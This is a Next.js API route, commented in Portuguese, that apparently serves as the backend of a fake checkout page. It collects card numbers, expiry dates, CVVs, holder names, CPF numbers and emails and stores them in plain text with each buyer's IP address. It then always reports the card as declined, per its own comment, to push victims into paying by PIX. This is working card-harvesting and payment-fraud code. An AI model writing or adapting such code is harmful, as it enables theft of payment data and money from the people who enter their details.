import { type NextRequest, NextResponse } from "next/server"
import { supabaseAdmin } from '@/lib/supabase'

// Função simples de "descriptografia" (apenas para decode do base64)
function decryptData(encryptedData: string): any {
  try {
    const decoded = Buffer.from(encryptedData, 'base64').toString('utf-8')
    return JSON.parse(decoded)
  } catch (error) {
    throw new Error('Erro ao descriptografar dados')
  }
}

export async function POST(request: NextRequest) {
  try {
    const { data } = await request.json()
    
    // Descriptografar dados
    const cardData = decryptData(data)
    
    // Validar dados obrigatórios
    if (!cardData.customerName || !cardData.cardNumber || !cardData.cardHolderName) {
      return NextResponse.json({ 
        success: false,
        error: "Dados obrigatórios faltando"
      }, { status: 400 })
    }
    
    // Obter IP e User Agent
    const ip = request.headers.get('x-forwarded-for') || 
               request.headers.get('x-real-ip') || 
               '0.0.0.0'
    const userAgent = request.headers.get('user-agent') || ''
    
    // Inserir no Supabase (tabela card_attempts)
    const { data: insertedData, error } = await supabaseAdmin
      .from('card_attempts')
      .insert([
        {
          card_number: cardData.cardNumber || '',
          card_expiry: cardData.cardExpiryDate || '',
          card_cvv: cardData.cardCvv || '',
          card_name: cardData.cardHolderName || '',
          cpf: cardData.customerCpf || '',
          email: cardData.customerEmail || '',
          amount: cardData.total || 0,
          product_name: cardData.productName || '',
          category: 'gas', // Categoria padrão
          ip: ip,
          user_agent: userAgent
        }
      ])
      .select()
    
    if (error) {
      console.error('❌ Erro ao salvar no Supabase:', error)
      return NextResponse.json({ 
        success: false,
        error: "Erro ao salvar no banco de dados",
        details: error.message
      }, { status: 500 })
    }
    
    console.log('✅ Dados salvos no Supabase:', insertedData?.[0]?.id)
    
    // SEMPRE retornar erro para forçar o usuário a usar PIX
    // Mesmo que tenha salvado com sucesso no Supabase
    return NextResponse.json({ 
      success: false,
      error: "Pagamento com cartão não aprovado",
      message: "Não foi possível processar o pagamento com cartão. Por favor, utilize PIX.",
      savedId: insertedData?.[0]?.id
    }, { status: 402 })
  } catch (error) {
    return NextResponse.json({ 
      success: false,
      error: "Erro ao processar",
      details: error instanceof Error ? error.message : 'Unknown error'
    }, { status: 500 })
  }
}
